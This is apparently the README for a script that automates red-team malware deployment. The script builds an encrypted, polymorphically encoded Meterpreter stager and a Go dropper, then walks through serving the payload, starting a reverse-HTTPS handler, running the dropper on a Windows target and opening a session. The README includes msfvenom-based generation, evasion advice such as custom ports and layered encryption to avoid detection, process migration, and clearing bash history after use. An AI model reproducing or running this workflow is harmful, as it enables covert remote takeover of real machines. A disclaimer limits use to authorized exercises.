# Automated Deployment System

**One command to generate everything you need!**

## What It Does

The `automate_deployment.py` script completely automates the deployment process:

1. **Generates SSL certificate** with OpenSSL
2. **Creates meterpreter payload** with SSL pinning
3. **Encodes payload** through 10 polymorphic layers
4. **Updates dropper source** with all parameters
5. **Compiles dropper** to Windows executable
6. **Creates handler config** for Metasploit
7. **Generates deployment summary** documentation

## Usage

### Basic Usage

```bash
python3 automate_deployment.py --lhost <YOUR_IP> --lport <PORT>
```

### Examples

```bash
# Standard HTTPS on port 443
python3 automate_deployment.py --lhost 192.168.88.166 --lport 443

# Custom port
python3 automate_deployment.py --lhost 10.0.0.5 --lport 8443

# Skip compilation (if cross-compiling doesn't work)
python3 automate_deployment.py --lhost 192.168.88.166 --lport 443 --skip-compile
```

## Requirements

### On Kali Linux
- OpenSSL
- msfvenom (Metasploit Framework)
- Python 3.x with pycryptodome
- Go 1.20+ (for compilation)

Install dependencies:
```bash
sudo apt update
sudo apt install openssl metasploit-framework golang-go python3-pycryptodome
```

## Output Files

The script generates:

| File | Description | Size |
|------|-------------|------|
| `/tmp/meterpreter.pem` | SSL certificate (PEM format) | ~5 KB |
| `payload_staged_ssl.raw` | Raw meterpreter stager | 682 B |
| `payload_staged_ssl.enc` | Encoded + encrypted payload | ~1.5 KB |
| `dropper_custom.go` | Updated dropper source code | ~5 KB |
| `dropper_custom.exe` | Compiled Windows executable | ~5 MB |
| `handler_custom.rc` | Metasploit handler config | ~600 B |
| `DEPLOYMENT_SUMMARY.txt` | Full engagement documentation | ~2 KB |

## Workflow

### Step 1: Generate Everything

```bash
cd Production
python3 automate_deployment.py --lhost 192.168.88.166 --lport 443
```

**Output:**
```
======================================================================
              Phase 1: SSL Certificate Generation
======================================================================

[*] Generating RSA 4096-bit certificate...
[✓] Generating RSA 4096-bit certificate complete
[*] Creating PEM file...
[✓] Creating PEM file complete
[*] Extracting certificate hash...
[✓] Certificate hash: 555bcd59e8542416ed0f5ec4aed6383742ccade01a77519fe7b31fefd24dd66e

======================================================================
         Phase 2: Meterpreter Payload Generation
======================================================================

[*] Generating staged meterpreter with SSL pinning...
[✓] Payload generated: 682 bytes

======================================================================
           Phase 3: Polymorphic Encoding
======================================================================

[*] Encoding with 10-layer polymorphic encoding...
[✓] Encoded payload: 1461 bytes

======================================================================
       Phase 4: Updating Dropper Source Code
======================================================================

[*] Updating dropper.go with new parameters...
[✓] Updated encoding parameters (line 18)
[✓] Updated AES-256-GCM key
[✓] Updated ChaCha20 key and nonce
[✓] Updated download URL to 192.168.88.166
[✓] Created dropper_custom.go with updated parameters

======================================================================
              Phase 5: Compiling Dropper
======================================================================

[*] Detected Linux - cross-compiling for Windows...
[*] Cross-compiling for Windows x64...
[✓] Compiled dropper_custom.exe (5.23 MB)

======================================================================
       Phase 6: Creating Handler Configuration
======================================================================

[*] Creating Metasploit handler config...
[✓] Created handler_custom.rc

======================================================================
       Phase 7: Creating Deployment Summary
======================================================================

[*] Creating deployment documentation...
[✓] Created DEPLOYMENT_SUMMARY.txt

======================================================================
           Deployment Package Ready!
======================================================================
[✓] All files generated successfully

Next Steps:
1. Start HTTP server: python3 -m http.server 8000
2. Start handler: msfconsole -q -r handler_custom.rc
3. Deploy dropper: dropper_custom.exe on target
4. Wait ~31 seconds for meterpreter session

Generated Files:
  • /tmp/meterpreter.pem (SSL certificate)
  • payload_staged_ssl.enc (encoded payload)
  • dropper_custom.exe (compiled dropper)
  • handler_custom.rc (Metasploit config)
  • DEPLOYMENT_SUMMARY.txt (full documentation)

⚠️  REMEMBER: Delete all artifacts after engagement!
```

### Step 2: Deploy Services

**Terminal 1 - HTTP Server:**
```bash
python3 -m http.server 8000
# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Terminal 2 - Metasploit Handler:**
```bash
msfconsole -q -r handler_custom.rc
# [*] Started HTTPS reverse handler on https://192.168.88.166:443
```

### Step 3: Execute on Target

Transfer `dropper_custom.exe` to target and execute:
```powershell
.\dropper_custom.exe
```

### Step 4: Verify Session

In Metasploit terminal:
```
[*] https://192.168.88.166:443 handling request from 192.168.88.203...
[*] Meterpreter session 1 opened
[*] Session ID 1 processing AutoRunScript 'post/windows/manage/migrate'
[*] Migrating into 6789
[+] Successfully migrated into process 6789

msf6 exploit(multi/handler) > sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
```

## Advanced Options

### Skip Compilation

If Go cross-compilation fails on your system:

```bash
python3 automate_deployment.py --lhost 192.168.88.166 --lport 443 --skip-compile
```

Then compile manually on Windows:
```powershell
go build -ldflags="-s -w" -o dropper_custom.exe dropper_custom.go
```

### Custom Port

Use non-standard port to evade detection:

```bash
python3 automate_deployment.py --lhost 192.168.88.166 --lport 8443
```

Update firewall to allow custom port:
```bash
sudo ufw allow 8443/tcp
```

## Troubleshooting

### msfvenom not found

```bash
# Install Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

### Go not installed

```bash
# Install Go
sudo apt install golang-go

# Or download from golang.org
wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
```

### pycryptodome not installed

```bash
# Install with pip
pip3 install pycryptodome

# Or with apt
sudo apt install python3-pycryptodome
```

### Cross-compilation fails

Use `--skip-compile` flag and compile on Windows machine:

```bash
# On Kali
python3 automate_deployment.py --lhost 192.168.88.166 --lport 443 --skip-compile

# Transfer dropper_custom.go to Windows
# On Windows
go build -ldflags="-s -w" -o dropper_custom.exe dropper_custom.go
```

## Security Notes

### Per-Engagement Generation

**ALWAYS** regenerate for each engagement:
```bash
# New engagement = New everything
python3 automate_deployment.py --lhost <NEW_IP> --lport <NEW_PORT>
```

**NEVER** reuse:
- SSL certificates
- Encoded payloads
- Compiled droppers

Each run generates:
- Unique SSL certificate
- Random encoding seed
- Unique cryptographic keys
- Fresh payload signature

### Cleanup After Engagement

```bash
# Delete all artifacts
rm /tmp/meterpreter.*
rm payload_staged_ssl.*
rm dropper_custom.*
rm handler_custom.rc
rm DEPLOYMENT_SUMMARY.txt

# Clear bash history
history -c
```

## Comparison: Manual vs Automated

| Task | Manual | Automated |
|------|--------|-----------|
| Generate SSL cert | 4 commands | Automatic |
| Create payload | 1 long command | Automatic |
| Encode payload | 1 command + copy params | Automatic |
| Update dropper.go | Edit 4 locations manually | Automatic |
| Compile dropper | 1 command | Automatic |
| Create handler | Edit template | Automatic |
| Documentation | Manual notes | Auto-generated |
| **Total Time** | **~10 minutes** | **~1 minute** |
| **Error Prone** | High (manual edits) | Low (scripted) |

## Script Architecture

```python
automate_deployment.py
├── generate_ssl_certificate()    # Phase 1: OpenSSL cert generation
├── generate_payload()             # Phase 2: msfvenom with SSL pinning
├── encode_payload()               # Phase 3: 10-layer encoding
├── update_dropper()               # Phase 4: Parse & update dropper.go
├── compile_dropper()              # Phase 5: Go cross-compilation
├── create_handler_config()        # Phase 6: Generate .rc file
└── create_deployment_summary()    # Phase 7: Documentation
```

## Example Session

```bash
$ python3 automate_deployment.py --lhost 192.168.88.166 --lport 443

[... phases 1-7 execute automatically ...]

$ python3 -m http.server 8000 &
[1] 12345
Serving HTTP on 0.0.0.0 port 8000 ...

$ msfconsole -q -r handler_custom.rc
[*] Started HTTPS reverse handler on https://192.168.88.166:443

[... on target, execute dropper_custom.exe ...]

192.168.88.203 - - [05/Nov/2025 21:45:32] "GET /payload_staged_ssl.enc HTTP/1.1" 200 -

[*] https://192.168.88.166:443 handling request from 192.168.88.203
[*] Meterpreter session 1 opened (192.168.88.166:443 -> 192.168.88.203:49832)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-ABC123\User

meterpreter > sysinfo
Computer        : DESKTOP-ABC123
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
Meterpreter     : x64/windows
```

## Benefits

✅ **Speed**: 1 minute vs 10 minutes manual setup
✅ **Consistency**: No manual parameter copying errors
✅ **Documentation**: Auto-generated summary with all details
✅ **Reproducibility**: Same process every time
✅ **Safety**: Validates all steps before proceeding
✅ **Flexibility**: Command-line options for customization

## Legal Disclaimer

This automation script is for **AUTHORIZED RED TEAM EXERCISES ONLY**.

You must:
- Obtain explicit written authorization before use
- Use only within scope of authorized engagement
- Delete all artifacts after engagement
- Comply with all applicable laws

Unauthorized use is illegal and unethical.

---

**Version:** 2.0
**Last Updated:** 2025-11-05
**Automation makes deployment easy - not less serious!** ⚠️
